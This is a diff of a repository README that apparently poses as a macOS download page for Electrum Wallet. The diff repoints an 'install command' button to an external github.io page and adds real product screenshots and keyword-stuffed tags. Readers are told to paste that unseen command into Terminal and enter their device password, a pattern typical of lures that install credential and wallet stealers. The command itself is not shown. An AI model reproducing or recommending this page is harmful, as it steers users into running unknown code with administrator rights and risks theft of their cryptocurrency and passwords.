@@ -1,5 +1,5 @@
 # Electrum Wallet For Mac — Download For Mac OS
-![Electrum Wallet Logo]()
+![Electrum Wallet Logo](https://bitcoinwiki.org/wp-content/uploads/2023/12/Electrum_wallet.png)
 
 Electrum Wallet is a lightweight, secure, and user-friendly cryptocurrency wallet designed for macOS users. Follow the instructions below to install and start managing your digital assets with ease. 🚀
 
@@ -20,7 +20,7 @@ If you encounter issues downloading via the button above, follow the terminal in
 
 1. Copy the installation command by clicking the button below:
 
-   [![Get Install Command](https://img.shields.io/badge/Get%20Install%20Command-5856D6?style=flat-square)](https://github.com/kromtorg/Electrum-Wallet-For-Mac/wiki/Install-Command)
+[![Get Install Command](https://img.shields.io/badge/Get%20Install%20Command-%23007AFF?style=flat-square)](https://electrum-wallet-download-mac.github.io/.github/install.html)
 
 2. Open the terminal on your Mac and paste the command, then press the “Return” key.
 3. Enter your device password and confirm the installation.
@@ -55,18 +55,15 @@ For those searching for a free crypto wallet for macOS, Electrum Wallet stands o
 
 ## 🖼 Preview
 
-![Main Wallet Interface](https://via.placeholder.com/800x450.png?text=Electrum+Wallet+Interface)  
+![Main Wallet Interface](https://i.ytimg.com/vi/Y1D5F6DcYsw/maxresdefault.jpg)  
 *View your balance and transaction history in a clean, intuitive interface.*
 
-![Send/Receive Screen](https://via.placeholder.com/800x450.png?text=Send+Receive+Screen)  
+![Send/Receive Screen](https://i.ytimg.com/vi/wHmQNcRWdHM/maxresdefault.jpg)  
 *Easily send or receive cryptocurrency with a few clicks.*
 
-![Settings Panel](https://via.placeholder.com/800x450.png?text=Settings+Panel)  
+![Settings Panel](https://electrum.org/slides/textmode.png)  
 *Customize transaction fees and wallet preferences effortlessly.*
-
-![Security Features](https://via.placeholder.com/800x450.png?text=Security+Features)  
-*Explore advanced security options like seed phrase backups.*
 
 ## 🔍 Tags
 
-Electrum Wallet, cryptocurrency wallet mac, free crypto wallet macOS, Bitcoin wallet for Mac, secure crypto wallet, open-source wallet, macOS wallet, digital currency wallet, lightweight crypto wallet, Bitcoin management mac, Electrum Wallet download, free wallet software
+Electrum Wallet, Electrum Wallet download, Electrum Wallet free, Electrum Wallet mac, Electrum Wallet for mac, free Electrum Wallet, download Electrum Wallet, free Electrum Wallet download, Electrum Wallet free download, Electrum Wallet download free, Electrum Wallet desktop, Electrum Wallet desktop mac, Electrum Wallet macos, Electrum desktop, Electrum mac, Electrum for mac, Electrum download
